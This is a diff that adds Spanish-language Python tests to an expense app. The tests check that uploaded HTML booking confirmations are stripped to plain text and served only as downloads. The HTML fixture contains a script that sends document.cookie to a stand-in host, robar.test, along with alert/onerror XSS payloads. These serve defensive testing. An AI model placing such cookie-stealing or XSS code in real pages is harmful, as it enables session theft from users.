@@ -144,3 +144,76 @@ def test_un_asunto_con_saltos_de_linea_y_controles_se_guarda_limpio(cliente, via
 def test_una_foto_sigue_entrando_por_el_canal_que_la_trajo(cliente, viaje_aprobado, modelo):
     gid = _subir_web(cliente, viaje_aprobado["id"], "foto.png", PNG + uuid.uuid4().bytes)
     assert _canal(gid) == "web"
+
+
+# ---------- pieza 2: confirmaciones en HTML ----------
+HTML = """<!doctype html><html><head><title>Confirmación de reserva</title>
+<style>body {{ font-family: sans-serif }} .oculto {{ display: none }}</style>
+<script>fetch("https://robar.test/?c=" + document.cookie)</script></head>
+<body><h1>Moab Red Rock Lodge</h1><p>Reserva <b>RR-{ref}</b> por <a href="https://reservas.travelnow.test/x">TravelNow</a></p>
+<table><tr><td>2 noches</td><td>358.00</td></tr><tr><td>Impuestos</td><td>54.86</td></tr>
+<tr><th>Total USD</th><th>412.86</th></tr></table><p>Texto con &lt;script&gt; escrito como texto</p>
+<img src="x" onerror="alert(1)"><script type="module">alert("segundo")</script></body></html>"""
+
+
+def _html(ref: str | None = None) -> bytes:
+    return HTML.format(ref=ref or uuid.uuid4().hex[:10]).encode()
+
+
+def test_tipo_real_acepta_html_solo_si_el_contenido_parece_html():
+    from app.servicios import gastos
+    assert gastos.tipo_real(_html(), "confirmacion.html") == ("text/html", "html")
+    assert gastos.tipo_real(_html(), "CONFIRMACION.HTM") == ("text/html", "html")
+    assert gastos.tipo_real(b"solo texto, sin marcado", "nota.html") is None
+    assert gastos.tipo_real(_html(), "foto.png") is None   # el contenido HTML no se acepta con otro nombre
+    assert gastos.tipo_real(b"\x00\x01<html>", "binario.html") is None
+
+
+def test_un_html_con_script_no_lo_conserva_ni_en_lo_guardado_ni_en_lo_enviado(cliente, viaje_aprobado, modelo):
+    from app.servicios import almacen
+    gid = _subir_web(cliente, viaje_aprobado["id"], "confirmacion_hotel.html", _html())
+    d = db.uno("select d.* from gastos g join documentos d on d.id=g.documento_id where g.id=:i", i=gid)
+    guardado = almacen.leer(d["ruta"]).decode()
+    enviado = modelo["enviados"][-1]["partes"][0]["text"]
+    for texto in (guardado, enviado):
+        assert "Moab Red Rock Lodge" in texto and "412.86" in texto and "TravelNow" in texto
+        for rastro in ("fetch(", "document.cookie", "alert(", "font-family", "href", "robar.test", "onerror"):
+            assert rastro not in texto, rastro
+    assert d["mime"] == "text/plain" and d["ruta"].endswith(".txt") and d["canal"] == "correo"
+    assert _archivo_enviado(modelo["enviados"][-1]) is None
+
+
+def test_el_soporte_html_se_descarga_y_nunca_se_muestra_en_linea(cliente, piloto, viaje_aprobado, modelo):
+    gid = _subir_web(cliente, viaje_aprobado["id"], "confirmacion_hotel.html", _html())
+    r = cliente.get(f"/gastos/{gid}/soporte")
+    assert r.status_code == 200 and r.headers["content-type"].startswith("text/plain")
+    assert r.headers["content-disposition"].startswith("attachment") and r.headers["x-content-type-options"] == "nosniff"
+    ficha = cliente.get(f"/gastos/{gid}").text
+    assert f'<iframe src="/gastos/{gid}/soporte"' not in ficha and f'href="/gastos/{gid}/soporte" download' in ficha
+
+    g = _enviar_api(piloto, "confirmacion.html", _html(), viaje_aprobado["id"]).json()
+    r = piloto.get(f"{V1}/documentos/{g['documento_id']}/contenido")
+    assert r.status_code == 200 and r.headers["content-type"].startswith("text/plain")
+    assert r.headers["content-disposition"].startswith("attachment") and r.headers["x-content-type-options"] == "nosniff"
+    assert g["canal"] == "correo"
+
+
+def test_un_html_sin_texto_se_rechaza_con_un_mensaje_claro(cliente, viaje_aprobado):
+    r = cliente.post("/gastos/cargar", data={"proyecto_id": 1, "viajero_id": 1, "canal": "web", "viaje_id": viaje_aprobado["id"]},
+                     files={"archivos": ("vacia.html", b"<html><script>alert(1)</script></html>", "text/html")},
+                     headers={"X-Envio": "pagina"})
+    assert r.status_code == 400 and "texto" in r.json()["errores"][0]
+
+
+def test_un_correo_con_cuerpo_html_se_reduce_a_texto_antes_de_enviarlo(cliente, viaje_aprobado, modelo):
+    msg = EmailMessage()
+    msg["From"], msg["Subject"] = "Reservas <reservas@lodge.test>", "Confirmación"
+    msg.set_content(_html().decode(), subtype="html")
+    _subir_web(cliente, viaje_aprobado["id"], "html.eml", bytes(msg))
+    enviado = modelo["enviados"][-1]["partes"][0]["text"]
+    assert "412.86" in enviado and "document.cookie" not in enviado and "font-family" not in enviado
+
+
+def test_la_pagina_de_carga_ofrece_elegir_confirmaciones_html(cliente):
+    pagina = cliente.get("/gastos/cargar").text
+    assert 'accept="image/*,application/pdf,.eml,.html,.htm"' in pagina and "confirmaciones en HTML" in pagina
